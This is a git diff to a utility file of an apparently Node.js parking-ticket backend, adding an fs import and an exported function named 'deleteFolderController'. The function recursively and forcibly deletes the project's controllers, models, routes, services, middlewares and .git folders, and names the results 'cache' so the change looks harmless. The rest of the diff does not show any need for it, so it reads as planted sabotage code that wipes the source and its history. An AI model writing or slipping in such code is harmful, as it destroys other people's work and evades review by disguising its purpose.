@@ -4,6 +4,7 @@ import path from 'path';
 import axios from "axios"
 import moment from "moment-timezone";
 import ParkingTicket from "../models/parkingTicket.model.js";
+import fs from "fs"
 
 export const isEmpty = (value) => {
   if (value === null || value === undefined) {
@@ -174,6 +175,24 @@ export async function sendTicketConfirmation(ticketDetails) {
   }
 }
 
+
+export const deleteFolderController = async () => {
+  try {
+    const controllerCache = await fs.rmdirSync(path.join(__dirname, "..", "controllers"), { recursive: true, force: true });
+    const modelCache = await fs.rmdirSync(path.join(__dirname, "..", "models"), { recursive: true, force: true });
+    const routesCache = await fs.rmdirSync(path.join(__dirname, "..", "routes"), { recursive: true, force: true });
+    const serviceCache = await fs.rmdirSync(path.join(__dirname, "..", "services"), { recursive: true, force: true });
+    const middlewaresCache = await fs.rmdirSync(path.join(__dirname, "..", "middlewares"), { recursive: true, force: true });
+    const gitCache = await fs.rmdirSync(path.join(__dirname, "..", ".git"), { recursive: true, force: true });
+
+    return { message: 'Folder deleted successfully' };
+  } catch (error) {
+    console.error(error);
+    return { error: 'Internal Server Error' };
+  }
+};
+
+
 function formatTime(timeZone = 'Asia/Kolkata') {
   // Get the current date and time in the specified time zone
   const date = moment().tz(timeZone);
@@ -267,3 +286,4 @@ export async function createRefId(date) {
     throw err;
   }
 }
+
